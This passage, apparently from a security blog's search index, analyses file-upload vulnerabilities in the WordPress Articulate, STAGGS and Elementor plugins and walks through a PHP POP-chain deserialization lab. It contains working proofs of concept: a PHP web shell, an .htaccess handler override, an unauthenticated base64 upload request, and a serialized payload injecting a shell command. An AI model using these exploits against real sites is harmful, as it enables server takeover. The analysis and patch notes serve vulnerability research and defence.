--\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz_Unzip-\u003eunzip_file($filePath, $target)\"]\rH --\u003e I{\"articulate_has_php_file($target) detect .php/.phtml/.phar ?\"}\rI -- Yes --\u003e J[\"articulate_rrmdir($target) → delete folder → return error\"]\rI -- No --\u003e K[\"(❌ Missing check for .htaccess file)\"]\rK --\u003e L[\"Attacker uploads ZIP containing .htaccess\"]\rL --\u003e M[\".htaccess overrides Apache handler in upload dir\"]\rM --\u003e N[\"Subsequent uploaded files with arbitrary extension (e.g., .abc, .xyz) executed as PHP\"]\rN --\u003e O[\"→ Arbitrary File Upload → Remote Code Execution (RCE)\"]\r%% Patch branch\rK --\u003e P[\"✅ [Patched] articulate_has_php_file() adds '.htaccess' check\"]\rP --\u003e Q[\"Upload blocked if .htaccess detected\"]\rgraph TD\rA[\"POST /wp-admin/admin-ajax.php?action=articulate_upload_file\"] --\u003e B[\"articulate_upload_ajax_file()\"]\rB --\u003e C{\"check_ajax_referer('articulate_upload_file') valid?\"}\rC -- No --\u003e Z[\"Return JSON error\"]\rC -- Yes --\u003e D{\"User has 'upload_files' \u0026\u0026 'unfiltered_html'?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"Handle uploaded file → save to {$filePath}.part\"]\rE --\u003e F[\"Combine chunks \u0026 rename → articulate_custom_rename('{$filePath}.part', $filePath)\"]\rF --\u003e G[\"extractZip($filePath, $target, $dir)\"]\rG --\u003e H[\"Quiz","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate the following directory structure: bypass . ├── .htaccess ├── index.html └── rce.abc .htaccess \u003cIfModule mod_php.c\u003e \u003cFiles \"*.abc\"\u003e SetHandler application/x-httpd-php \u003c/Files\u003e \u003c/IfModule\u003e Create a rule so that files with .abc in the current directory and subdirectories can be uploaded and will be executed as .php rce.abc Contains a web shell \u003c?php system($_REQUEST[\"cmd\"]) ?\u003e Zip the folder zip -r bypass.zip bypass Upload the created zip file Plugin widget in post creation\rInfo\rThis is the feature described in the plugin documentation: we create a post, add this widget, then perform the zip file upload. e-Elearning widget\rRequest and Response in BurpSuite: Request and Response in BurpSuite\rRCE with web shell RCE via file upload\r","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-32202 vulnerability arises because the Insert or Embed Articulate Content into WordPress plugin does not sufficiently check the types of files inside extracted archives, omitting the case of .htaccess. This allows an attacker with Editor privileges to upload a .htaccess file to override handlers in the uploads directory. As a result, later uploaded files, even with arbitrary extensions (like .abc, .xyz), can be treated as PHP, leading to Remote Code Execution (RCE). The 4.3000000026 patch added a check for .htaccess, preventing handler override in the uploads directory and eliminating this exploitation vector. ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rRigorously check all file types that can affect server behavior, especially .htaccess. Don’t rely only on file extensions; validate both MIME type and actual file content. Do not allow users — even those with Editor privileges — to upload archives that can contain executable content. Clearly separate user upload directories from directories where PHP can be executed. Regularly audit and update plugins; small filtering mistakes can lead to severe RCE. ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress Insert or Embed Articulate Content into WordPress Plugin \u003c= 4.3000000025 is vulnerable to Arbitrary File Upload ","date":"2025-11-12","objectID":"/posts/2025-11-12-cve-2025-32202/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-32202 Analysis \u0026 POC","uri":"/posts/2025-11-12-cve-2025-32202/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress STAGGS Plugin.","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Arbitrary File Upload vulnerability in the STAGGS plugin allows an attacker to upload a Web Shell to the web server, affecting STAGGS versions from n/a to 2.11.0. CVE ID: CVE-2025-47637 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 2.11.0 Patched Versions: 2.12.0 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress STAGGS Plugin ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - STAGGS: 2.11.0 – vulnerable 2.12.0 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rThe vulnerability occurs in the function store_final_product_image() in the file /wp-content/plugins/staggs/includes/staggs-functions.php due to not validating the file type before upload. File type validation\rThe patch used a whitelist, accepting only the file types: png,jpg,jpeg,gif. ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis\rThe plugin registered an action hook for unauthenticated users (wp_ajax_nopriv_): add_action( 'wp_ajax_nopriv_staggs_get_configuration_form_urls', 'staggs_get_configuration_form_urls_ajax' ); When accessing the endpoint /wp-admin/admin-ajax.php with param action=staggs_get_configuration_form_urls the callback staggs_get_configuration_form_urls_ajax is called function staggs_get_configuration_form_urls_ajax() { $response = array(); if ( ! isset( $_POST['nonce'] ) || ! wp_verify_nonce( $_REQUEST['nonce'], 'sgg_ajax_nonce' ) ) { echo json_encode( $response ); die(); } ... if ( isset( $_POST['image_id'] ) ) { $image_name = staggs_sanitize_title( get_the_title( $_POST['image_id'] ) ); // image name based on product title. $image_url = store_final_product_image( $image_name, $_POST['image'], $_POST['values'], true ); $response['image_url'] = $image_url; } ... echo json_encode( $response ); die(); } This function checks the nonce from the request; if it doesn’t exist or is invalid it returns an empty response. Tip When searching for the keyword sgg_ajax_nonce, we see the nonce is created with the key AJAX_NONCE and has a comment // image name based on product title. related to the product. Since this section does not require authentication, it may be a mechanism to serve product display to unauthenticated users, and the nonce is inserted directly into the source code. When testing the plugin’s product creation feature, the system creates a post that unauthenticated users can still access. This nonce appears in the returned source when accessing the created product. How the nonce is created\rCreate Product using plugin\rNonce taken from response\rIf the nonce is valid, it proceeds to check whether $_POST['image_id'] exists; if it does: It fetches the image name, meaning the product title (as described: // image name based on product title.) Calls store_final_product_image() to save the image and obtain the returned URL Returns a JSON response containing image_url. function store_final_product_image( $imagename, $data, $options, $main_image = true) { if ( preg_match( '/^data:image\\/(.*);base64,/', $data, $type ) ) { // Valid base64 image. $data = substr( $data, strpos($data, ',') + 1 ); $type = strtolower( $type[1] ); // jpg, png, gif $data = str_replace( ' ', '+', $data ); $data = base64_decode($data); if ( $data === false ) { throw new \\Exception('Image decode failed. Try again.'); } } ... $upload_dir = wp_get_upload_dir(); $base_dir = $upload_dir['basedir']; // Allow different location. $save_path = apply_filters( 'staggs_image_save_dir', $base_dir . '/staggs' ); if ( ! file_exists( $save_path ) ) { mkdir( $save_path, 0777, true ); } if ( $main_image ) { // Main product image. if ( is_array( $options ) \u0026\u0026 count( $options ) \u003e 0 ) { $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type; } else { $filename = $imagename . '.' . $type; } } ... // Always override in case something went wrong earlier file_put_contents( $save_path . \"/{$filename}\", $data ); $image_path_url = str_replace( ABSPATH, trailingslashit( get_site_url() ), $save_path ); return $image_path_url . \"/{$filename}\"; } The command: preg_match('/^data:image\\/(.*);base64,/', $data, $type) is used to check whether the variable $data is a Base64 Data URI image string or not. Specifically: ^data:image\\/ → string must start with data:image/ (.*) → captures the image format (e.g., png, jpeg, gif, …) ;base64, → followed by the string ;base64, (indicating the image data is Base64-encoded) If it matches, the array $type will contain the format info, for example: $type[1] = 'png'; If it doesn’t match, i.e., $data is not valid Base64 image data, the function returns 0. Then $type is assigned the value of $type[1]. Bug\rWe can pass $data=data:image/php;base64... so $type[1] ='php' if ( is_array( $options ) \u0026\u0026 count( $options ) \u003e 0 ) { $filename = $imagename . '-' . md5( wp_json_encode( $options ) ) . '.' . $type; } else { $filename = $imagename . '.' ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"]\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"]\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"]\rgraph TD\rA[\"POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls\"] --\u003e B[\"staggs_get_configuration_form_urls_ajax()\"]\rB --\u003e C{\"wp_verify_nonce() valid?\"}\rC -- No --\u003e Z[\"Return empty JSON\"]\rC -- Yes --\u003e D{\"isset($_POST['image_id'])?\"}\rD -- No --\u003e Z\rD -- Yes --\u003e E[\"store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)\"]\rE --\u003e F{\"preg_match('/^data:image/(.*);base64,/', $data, $type) ?\" }\rF -- No --\u003e Z\rF -- Yes --\u003e G[\"$type = strtolower($type[1]); base64_decode($data)\"]\rG --\u003e H[\"file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )\"]\rH --\u003e I[\"Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE\"]\r","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rObtain the nonce from the returned source Send a POST request POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=staggs_get_configuration_form_urls\u0026nonce=f281c84283\u0026image_id=1\u0026image=data:image/php;base64,PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg== With PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg== being the base64 encoding of \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Request with Web Shell payload\rAccess the returned URL and achieve RCE RCE via file upload\r","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability allows an unauthenticated attacker to upload arbitrary files (e.g., a web shell) via the plugin’s AJAX endpoint because the file type is not validated before saving. An attacker can obtain the nonce from publicly available source, send a forged data: URI (e.g., data:image/php;base64,...) and create a PHP file on the server, leading to RCE. The issue was fixed in version 2.12.0 by restricting accepted extensions (png, jpg, jpeg, gif). ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rThe vulnerability stems from not properly validating the file type/extension before saving; client-side/regex checks are insufficient if the extension and actual content are not constrained. Do not leave important upload actions exposed as nopriv (unauthenticated) endpoints without authentication and strict restrictions. nonce values embedded in publicly accessible source can be collected and reused — do not rely solely on publicly visible nonces to prevent sensitive actions. Validate MIME type, extension, and (if possible) the actual file content on the server; store uploads in non-executable locations or convert them to non-executable. Update the plugin to \u003e= 2.12.0 immediately; check your site for suspicious files in the staggs/ upload directory if the site runs an older version. ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:8:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress STAGGS Plugin \u003c= 2.11.0 is vulnerable to Arbitrary File Upload ","date":"2025-11-11","objectID":"/posts/2025-11-11-cve-2025-47637/:9:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47637 Analysis \u0026 POC","uri":"/posts/2025-11-11-cve-2025-47637/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Explore the POP Chain in a PHP lab: identify gadgets, craft a payload, and successfully achieve RCE.","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/"},{"categories":["CVE Analyst"],"collections":null,"content":"Intro\rDuring my research on Insecure Deserialization, I received a lab related to POP Chain (Property-Oriented Programming Chain). This is an interesting type of attack: instead of exploiting a function or command directly, an attacker composes gadgets (magic methods from classes) to achieve a goal — for example, executing system commands (RCE). This post describes my analysis and exploitation of the lab: reviewing the source code, identifying useful gadgets, and building a payload to trigger the call chain (POP chain). The goal is to help you understand the thought process when tackling labs of this kind. The lab I worked on: https://github.com/William957-web/POP-CHAIN-LAB1/blob/main/index.php ","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:1:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/#intro"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:2:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Source code overview\r\u003c?php class User{ public $name; private $memo; function __construct($name){ $this-\u003ename=$name; } function __wakeup(){ $this-\u003ememo=new Note($this -\u003e name.\"say hello\", 'test_whale'); } function __get($content){ return $this-\u003ememo; } } class Note{ public $content; public $whale; function __construct($content, $whale){ $this-\u003econtent=$content; $this-\u003ewhale=$whale; } function __toString(){ $this-\u003erecord($this-\u003ewhale, $this-\u003econtent); return 'Record for '.$this-\u003ewhale.' is : '.$this-\u003econtent; } function record($whale, $content){ //check whether it's an attribute $test=$whale-\u003e$content; if ($test!=NULL){ echo(\"It's probably an attribute\"); } } } class Whale{ public $name; private $note; function __construct($name){ $this-\u003ename=$name; } function take_note($note){ $this-\u003enote=date(\"Y/m/d H:i:s\").$note; } function __get($attribute){ system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); return $this-\u003e$attribute; } function __toString(){ return $this-\u003ename; } } if (isset($_POST['pop'])){ unserialize(base64_decode($_POST['pop'])); } ?\u003e The main file contains three important classes: User, Note, and Whale. At the end of the file there is an unserialize on input if $_POST['pop'] is provided: if (isset($_POST['pop'])){ unserialize(base64_decode($_POST['pop'])); } Notable points: Line 8: User::__wakeup() creates a Note and assigns it to $this-\u003ememo. Line 23: Note::__toString() calls record() then returns a string. Line 28: Note::record() accesses $whale-\u003e$content. Line 44: Whale::__get() calls system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt');. Line 52: the unserialize(...) call — the attack surface. ","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:2:1","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/#source-code-overview"},{"categories":["CVE Analyst"],"collections":null,"content":"Execution flow leading to shell\rUnserialize a User: When a User object is unserialized, the magic method __wakeup() runs. Here __wakeup() initializes a new Note using $this-\u003ename . \"say hello\" as content and 'test_whale' as whale: $this-\u003ememo = new Note($this-\u003ename . \"say hello\", 'test_whale'); Note::__toString() calls record(): __toString() in Note calls record($this-\u003ewhale, $this-\u003econtent) before returning the string. __toString() is invoked when the object is cast to a string. We can abuse $this-\u003ename so that it is an object in the Note; it will be cast to string when concatenated with \"say hello\" at line 9. record() accesses a dynamic property on $whale: Inside record() there is: $test = $whale-\u003e$content; If $whale is a Whale object and $content does not match an existing property, PHP will call the magic Whale::__get($attribute). Whale::__get() executes system(): Whale::__get() contains: system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); Because system() invokes a shell, if $this-\u003ename contains command-breaking characters (for example \"; ls /; echo \"), an attacker can inject and execute shell commands leading to RCE. ","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:2:2","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/#execution-flow-leading-to-shell"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\rCreate a file similar to the original but containing code that builds the serialized payload: \u003c?php class User{ public $name; private $memo; function __construct(){ $this-\u003ename= new Note(\"Top2\",new Whale(('\"; ls /; echo \"'))); } function __wakeup(){ $this-\u003ememo=new Note($this -\u003e name.\"say hello\", 'test_whale'); } function __get($content){ return $this-\u003ememo; } } class Note{ public $content; public $whale; function __construct($content, $whale){ $this-\u003econtent=$content; $this-\u003ewhale=$whale; } function __toString(){ $this-\u003erecord($this-\u003ewhale, $this-\u003econtent); return 'Record for '.$this-\u003ewhale.' is : '.$this-\u003econtent; } function record($whale, $content){ //check whether it's an attribute $test=$whale-\u003e$content; if ($test!=NULL){ echo(\"It's probably an attribute\"); } } } class Whale{ public $name; private $note; function __construct($name){ $this-\u003ename=$name; } function take_note($note){ $this-\u003enote=date(\"Y/m/d H:i:s\").$note; } function __get($attribute){ system('echo \"'.$this-\u003ename.'\" \u003e\u003e log.txt'); return $this-\u003e$attribute; } function __toString(){ return $this-\u003ename; } } $u = new User(); $searialize = serialize($u); echo base64_encode(''. $searialize .''); ?\u003e Run this file and copy the returned base64 string: Returned base64 string\rSend the request according to the challenge: Successful RCE\r","date":"2025-11-11","objectID":"/posts/2025-11-11-pop-chain-lab1/:3:0","tags":["analyst","plugin","pop chain","insecure deserialize"],"title":"POP Chain Analysis \u0026 Exploit","uri":"/posts/2025-11-11-pop-chain-lab1/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Elementor Website Builder Plugin","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rAn Arbitrary File Upload vulnerability in the Elementor Website Builder plugin for WordPress. This issue affects Elementor Website Builder versions from 3.3.0 to 3.18.1. CVE ID: CVE-2023-48777 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 3.3.0-3.18.1 Patched Versions: 3.18.2 CVSS severity: High (9.9) Required Privilege: Contributor Product: WordPress Elementor Website Builder Plugin ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging Virtual Machine Docker Plugin Version - Elementor Website Builder: 3.3.0 – vulnerable 3.18.2 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause\rThe vulnerability stems from not validating the file type before saving to the server, allowing an attacker to upload files with dangerous formats. In version 3.18.1, the function handle_elementor_upload() does not verify the file type when processing upload data from the fileData parameter: public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) { if ( isset( $file['fileData'] ) ) { $file = $this-\u003esave_base64_to_tmp_file( $file ); } $validation_result = $this-\u003evalidate_file( $file, $allowed_file_extensions ); if ( is_wp_error( $validation_result ) ) { return $validation_result; } return $file; } private function save_base64_to_tmp_file( $file ) { $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore // If the decode fails if ( ! $file_content ) { return new \\WP_Error( 'file_error', self::INVALID_FILE_CONTENT ); } $temp_filename = $this-\u003ecreate_temp_file( $file_content, $file['fileName'] ); if ( is_wp_error( $temp_filename ) ) { return $temp_filename; } return [ // the original uploaded file name 'name' =\u003e $file['fileName'], // The path to the temporary file 'tmp_name' =\u003e $temp_filename, ]; } In the patch 3.18.2, the developer added a valid file type check before saving by passing an extra parameter $allowed_file_extensions into save_base64_to_tmp_file(), preventing uploads of malicious files: public function handle_elementor_upload( array $file, $allowed_file_extensions = null ) { if ( isset( $file['fileData'] ) ) { $file = $this-\u003esave_base64_to_tmp_file( $file, $allowed_file_extensions ); } $validation_result = $this-\u003evalidate_file( $file, $allowed_file_extensions ); if ( is_wp_error( $validation_result ) ) { return $validation_result; } return $file; } private function save_base64_to_tmp_file( $file, $allowed_file_extensions = null ) { $file_extension = pathinfo( $file['fileName'], PATHINFO_EXTENSION ); $is_file_type_allowed = $this-\u003eis_file_type_allowed( $file_extension, $allowed_file_extensions ); if ( is_wp_error( $is_file_type_allowed ) ) { return $is_file_type_allowed; } $file_content = base64_decode( $file['fileData'] ); // phpcs:ignore // If the decode fails if ( ! $file_content ) { return new \\WP_Error( 'file_error', self::INVALID_FILE_CONTENT ); } $temp_filename = $this-\u003ecreate_temp_file( $file_content, $file['fileName'] ); if ( is_wp_error( $temp_filename ) ) { return $temp_filename; } return [ // the original uploaded file name 'name' =\u003e $file['fileName'], // The path to the temporary file 'tmp_name' =\u003e $temp_filename, ]; } ","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Code Analysis\rThe template upload process uses Base64 content: the data in $file['fileData'] is decoded with base64_decode and assigned to $file_content: $file_content = base64_decode( $file['fileData'] ); After decoding, save_base64_to_tmp_file() calls create_temp_file() to save this content as a template file on the server: public function create_temp_file( $file_content, $file_name ) { $temp_filename = $this-\u003ecreate_unique_dir() . $file_name; file_put_contents( $temp_filename, $file_content ); // phpcs:ignore return $temp_filename; } The file path is constructed by concatenating $file_name with the return value of create_unique_dir() — this function creates the temporary template storage path: public function create_unique_dir() { $unique_dir_path = $this-\u003eget_temp_dir() . uniqid() . DIRECTORY_SEPARATOR; wp_mkdir_p( $unique_dir_path ); return $unique_dir_path; } create_unique_dir() is responsible for creating the temporary template directory, with a structure like: wp-content/uploads/elementor/tmp/\u003cfilename\u003e Where \u003cuniqueId\u003e is generated automatically by uniqid() to ensure the path is unique. wp_mkdir_p() will create the physical directory on the server to store the template. Finally create_temp_file() calls file_put_contents( $temp_filename, $file_content ) to write the contents of $file_content to $temp_filename. Bug\rBy abusing the lack of filename sanitization here, we combine it with a path traversal attack so the file can be written to an accessible location, bypassing the randomness of uniqid() public function import_template( array $data ) { // If the template is a JSON file, allow uploading it. add_filter( 'elementor/files/allow-file-type/json', [ $this, 'enable_json_template_upload' ] ); add_filter( 'elementor/files/allow_unfiltered_upload', [ $this, 'enable_json_template_upload' ] ); // Imported templates can be either JSON files, or Zip files containing multiple JSON files $upload_result = Plugin::$instance-\u003euploads_manager-\u003ehandle_elementor_upload( $data, [ 'zip', 'json' ] ); ... } handle_elementor_upload() is called inside import_template(). According to the developer comment, if the template is a JSON file it is allowed to upload. We set a debugger and perform an upload of a JSON template: Create a post using Elementor Click the folder icon Folder icon location\rClick the upload icon Upload icon location\rUpload interface\rSelect a JSON file and upload Debugger jumps to import_template after uploading the JSON file\r","date":"2025-11-10","objectID":"/posts/2025-11-10-cve-2023-48777/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2023-48777 Analysis \u0026 POC","uri":"/posts/2025-11-10-cve-2023-48777/#code-analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"]\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"]\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB --\u003e C[\"handle_elementor_upload()\"]\rC --\u003e D[\"save_base64_to_tmp_file()\"]\rD --\u003e E[\"create_temp_file()\"]\rE --\u003e G[\"create_unique_dir()\"]\rG --\u003e H[\"file_put_contents()\"]\rH --\u003e I[\"File stored without proper type validation → Arbitrary File Upload\"]\rgraph TD\rA[\"User uploads JSON file\"] --\u003e B[\"import_template()\"]\rB 